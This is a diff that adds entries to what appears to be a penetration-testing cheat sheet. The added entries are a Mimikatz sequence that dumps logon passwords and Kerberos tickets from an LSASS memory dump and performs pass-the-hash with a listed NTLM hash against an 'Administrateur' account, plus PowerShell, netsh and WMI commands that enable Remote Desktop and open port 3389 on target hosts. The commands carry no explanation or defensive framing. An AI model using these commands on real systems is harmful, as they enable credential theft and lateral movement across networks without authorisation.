@@ -215,3 +215,26 @@ If (Test-Path $ResultFile)  {
 }Else  {
   write-error "File $($ResultFile) does not exist!"
 }
+===========================================
+Mimikatz:
+mimikatz # privilege::debug
+mimikatz # sekurlsa::minidump lsass.dmp
+mimikatz # sekurlsa::logonpasswords
+mimikatz # sekurlsa::pth /user:Administrateur /domain:chocolate.local /ntlm:cc36cf7a8514893efccd332446158b1a
+mimikatz # sekurlsa::kerberos
+===========================================
+Enable Remote Desktop with Powershell:
+Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -Value 0
+Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
+netsh advfirewall firewall add rule name="allow RemoteDesktop" dir=in protocol=TCP localport=3389 action=allow
+
+If you need to enable secure RDP authentication (NLA – Network Level Authentication), run the command:
+Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 1
+
+Test-NetConnection 192.168.1.11 -CommonTCPPort rdp
+===========================================
+Enable Remote Desktop With WMI:
+Get-WmiObject -Class Win32_TerminalServiceSetting -Namespace root\CIMV2\TerminalServices -Computer 192.168.1.90 -Authentication 6
+
+(Get-WmiObject -Class Win32_TerminalServiceSetting -Namespace root\CIMV2\TerminalServices -Computer 192.168.1.90 -Authentication 6).SetAllowTSConnections(1,1)
+
